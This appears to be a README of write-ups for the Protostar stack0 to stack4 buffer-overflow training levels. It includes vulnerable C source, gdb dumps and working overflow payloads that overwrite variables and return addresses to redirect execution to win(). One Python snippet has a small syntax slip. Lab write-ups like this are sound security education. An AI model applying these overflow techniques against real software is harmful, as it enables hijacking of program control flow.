# protostar_writeups

stack0 :
   
   Source code fir this challenge is 
   ```
    #include <stdlib.h>
    #include <unistd.h>
    #include <stdio.h>

    int main(int argc, char **argv)
    {
      volatile int modified;
      char buffer[64];

      modified = 0;
      gets(buffer);

      if(modified != 0) {
          printf("you have changed the 'modified' variable\n");
      } else {
          printf("Try again?\n");
      }
    }
   ```
   
   We need to change the integer called modified to something that is not zero.
   
   run stack0 in gdb and disassemble main
   
   ```
   (gdb) disassemble main
Dump of assembler code for function main:
0x080483f4 <main+0>:    push   ebp
0x080483f5 <main+1>:    mov    ebp,esp
0x080483f7 <main+3>:    and    esp,0xfffffff0
0x080483fa <main+6>:    sub    esp,0x60
0x080483fd <main+9>:    mov    DWORD PTR [esp+0x5c],0x0               
0x08048405 <main+17>:   lea    eax,[esp+0x1c]
0x08048409 <main+21>:   mov    DWORD PTR [esp],eax
0x0804840c <main+24>:   call   0x804830c <gets@plt>
0x08048411 <main+29>:   mov    eax,DWORD PTR [esp+0x5c]               ; modified is loaded onto eax
0x08048415 <main+33>:   test   eax,eax                                ; test if eax is 0
0x08048417 <main+35>:   je     0x8048427 <main+51>
0x08048419 <main+37>:   mov    DWORD PTR [esp],0x8048500
0x08048420 <main+44>:   call   0x804832c <puts@plt>
0x08048425 <main+49>:   jmp    0x8048433 <main+63>
0x08048427 <main+51>:   mov    DWORD PTR [esp],0x8048529
0x0804842e <main+58>:   call   0x804832c <puts@plt>
0x08048433 <main+63>:   leave
0x08048434 <main+64>:   ret
End of assembler dump.
   ```
   
   Variable can be changed if we give any input with length > 64 and "modified" will be overwritten by next 4 bytes. Construct a payload with 64*'A' and 4 'B'(this is just to ensure that we have control over the variable). break at 0x08048417 to check if we have control over modified variable. Using the payload mentioned above(64*'A'+4*'B') eax should have a value of 0x42424242(nothing but BBBB)
   
   ```
   End of assembler dump.                                                                  
(gdb) b *0x08048417                                                                     
Breakpoint 1 at 0x8048417: file stack0/stack0.c, line 13.                               
(gdb) r < /tmp/s0.txt                                                                   
Starting program: /opt/protostar/bin/stack0 < /tmp/s0.txt                               
                                                                                        
Breakpoint 1, 0x08048417 in main (argc=1, argv=0xbffff864) at stack0/stack0.c:13        
13      stack0/stack0.c: No such file or directory.                                     
        in stack0/stack0.c                                                              
(gdb) i r                                                                               
eax            0x42424242       1111638594                                              
ecx            0xbffff76c       -1073744020                                             
edx            0xb7fd9334       -1208118476                                             
ebx            0xb7fd7ff4       -1208123404                                             
esp            0xbffff750       0xbffff750                                              
ebp            0xbffff7b8       0xbffff7b8                                              
esi            0x0      0                                                               
edi            0x0      0                                                               
eip            0x8048417        0x8048417 <main+35>                                     
eflags         0x200206 [ PF IF ID ]                                                    
cs             0x73     115                                                             
ss             0x7b     123                                                             
ds             0x7b     123                                                             
es             0x7b     123                                                             
fs             0x0      0                                                               
gs             0x33     51                                                              
(gdb)                                                                                   
   ```
   eax has changed to 0x42424242 thus overwrote "modified" 
   ```
   user@protostar:/opt/protostar/bin$ ./stack0 < /tmp/s0.txt
   you have changed the 'modified' variable
   ```
   
Stack1 :

  Same as stack0. Only difference is it requires an argument instead of input.Here strcpy copies argv[1] to buffer. strcpy doesn't check for length of buffer so it will continue writing to the buffer until it finds a null byte. So it can overwrite modified.  
  ```
  #include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv)
{
  volatile int modified;
  char buffer[64];

  if(argc == 1) {
      errx(1, "please specify an argument\n");
  }

  modified = 0;
  strcpy(buffer, argv[1]);

  if(modified == 0x61626364) {
      printf("you have correctly got the variable to the right value\n");
  } else {
      printf("Try again, you got 0x%08x\n", modified);
  }
}

  ```
   Since we already have control over "modified"("BBBB" in stack0) we just need to replace "BBBB" with "dcba ==>(0x64636261)". Since the machine islittle endian the order should be reversed.
   
   
   ```
   user@protostar:/opt/protostar/bin$ ./stack1 $(python -c "print 'A' *64 +'dcba'")
   you have correctly got the variable to the right value
   ```
   
   Stack2 :
   
   same as stack1 but strcpy copies data to buffer from an environment variable called "GREENIE". You can set environment variables with the command ``` export GREENIE= <any value>```. 
   
   Here modified vaiable is being compared to 0x0d0a0d0a. Inorder to modify "modified", GREENIE should be <64bytes>+"\x0a\x0d\x0a\x0d"(little endian for  0x0d0a0d0a )
   
   ```
   user@protostar:/opt/protostar/bin$ ./stack2
stack2: please set the GREENIE environment variable
user@protostar:/opt/protostar/bin$ export GREENIE="AAAA"
user@protostar:/opt/protostar/bin$ set | grep "GREENIE" 
GREENIE=AAAA
_=GREENIE
user@protostar:/opt/protostar/bin$ ./stack2
Try again, you got 0x00000000
user@protostar:/opt/protostar/bin$ export GREENIE=$(python -c "print 'A'*64+'\x0a\x0d\x0a\x0d'")
user@protostar:/opt/protostar/bin$ ./stack2
you have correctly modified the variable
   ```
Stack3 :

In this challenge we have to rewrite "modified" with the memory address of win(). Memory address of win can be found with gdb or objdump.
```
user@protostar:/opt/protostar/bin$ objdump -d stack3 | grep "win"
08048424 <win>:
user@protostar:/opt/protostar/bin$ gdb ./stack3
(gdb) disassemble win
Dump of assembler code for function win:
0x08048424 <win+0>:     push   ebp
0x08048425 <win+1>:     mov    ebp,esp
0x08048427 <win+3>:     sub    esp,0x18
0x0804842a <win+6>:     mov    DWORD PTR [esp],0x8048540
0x08048431 <win+13>:    call   0x8048360 <puts@plt>
0x08048436 <win+18>:    leave
0x08048437 <win+19>:    ret
End of assembler dump.
```

Here the problem is with gets call which will continue writing to or beyond buffer and can overwrite fp. By changing the value of fp to address of win() which is at  0x08048424. So user_input for gets call should be ```<any 64 bytes>+"\x24\x84\x04\x08"```

```
user@protostar:/opt/protostar/bin$ python -c "print 'A'*64+'\x24\x84\x04\x08'" > /tmp/s3.txt
user@protostar:/opt/protostar/bin$ ./stack3 </tmp/s3.txt
calling function pointer, jumping to 0x08048424
code flow successfully changed
```

Stack4 :

Disassembly of binary is as follows
```
(gdb) disassemble main
Dump of assembler code for function main:
0x08048408 <main+0>:    push   ebp
0x08048409 <main+1>:    mov    ebp,esp
0x0804840b <main+3>:    and    esp,0xfffffff0
0x0804840e <main+6>:    sub    esp,0x50
0x08048411 <main+9>:    lea    eax,[esp+0x10]
0x08048415 <main+13>:   mov    DWORD PTR [esp],eax
0x08048418 <main+16>:   call   0x804830c <gets@plt>
0x0804841d <main+21>:   leave
0x0804841e <main+22>:   ret
End of assembler dump.
```
Here buffer starts at esp+0x10 and extends until esp+0x10+0x40(64 bytes). we can make the code execute win() function if we can control eip register. Before calling a function, cpu pushes next instruction onto the stack so that it can return to that instruction aftter returning from function and then changes eip to the address present in the instruction. So here if we can overwrite RA with address of win() we can redirect code execution.

In order to control eip, we need to overwrite saved ebp and the address below that(which will be in eip after return) . The length of payload can either be found by using unique pattern and check the offset which overwrote eip after crash or by manual inspection. 

Here it occurs after 76 bytes
```
(gdb) b *0x0804841d
Breakpoint 1 at 0x804841d: file stack4/stack4.c, line 16.
(gdb) r
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /opt/protostar/bin/stack4 < /tmp/s4.txt

Breakpoint 1, main (argc=0, argv=0xbffff864) at stack4/stack4.c:16
16      stack4/stack4.c: No such file or directory.
        in stack4/stack4.c
(gdb) x/28x $esp
0xbffff760:     0xbffff770      0xb7ec6165      0xbffff778      0xb7eada75
0xbffff770:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffff780:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffff790:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffff7a0:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffff7b0:     0x41414141      0x41414141      0x41414141      0x42424242
0xbffff7c0:     0x00000000      0xbffff864      0xbffff86c      0xb7fe1848
(gdb) i r
eax            0xbffff770       -1073744016
ecx            0xbffff770       -1073744016
edx            0xb7fd9334       -1208118476
ebx            0xb7fd7ff4       -1208123404
esp            0xbffff760       0xbffff760
ebp            0xbffff7b8       0xbffff7b8
esi            0x0      0
edi            0x0      0
eip            0x804841d        0x804841d <main+21>
eflags         0x200246 [ PF ZF IF ID ]
cs             0x73     115
ss             0x7b     123
ds             0x7b     123
es             0x7b     123
fs             0x0      0
gs             0x33     51
```
as seen from here leave instruction will set esp to ebp and ret will pop the address at top of the stack and loads it in eip. So eip after ret should be 0x42424242 and it is expected to cause a seg.fault
```
(gdb) c
Continuing.

Program received signal SIGSEGV, Segmentation fault.
0x42424242 in ?? ()
```
Now that we have control over eip, we need to replace 0x42424242 with address of win(), which is at 0x080483f4

```
import struct

win_addr = 0x080483f4
print "A"*76+struct.pack("<I",win_addr)
```
Above python script works and it causes segfault because after executing win() function, next address on stack is null terminator. This can be avoided by making sure that next address on stack is the address of exit.
```
user@protostar:/opt/protostar/bin$ python ~/asd.py > /tmp/s4.txt
user@protostar:/opt/protostar/bin$ ./stack4 < /tmp/s4.txt
code flow successfully changed
Segmentation fault
```
Final pytohn code is :
```
import struct

win_addr = 0x080483f4
exit_addr = 0xb7ec60c0    ; obtained through gdb command > (p exit) and output is $2 = {<text variable, no debug info>} 0xb7ec60c0 <*__GI_exit>
print "A"*76+struct.pack("<I",win_addr)+struct.pack("<I",exit_addr)

```
and output is 
```
user@protostar:/opt/protostar/bin$ ./stack4 < /tmp/s4.txt
code flow successfully changed
user@protostar:/opt/protostar/bin$
```
Stack5 :
   Solution uploaded. Writeup todo

Stack6 :
   //TODO

Stack7 :
   //TODO
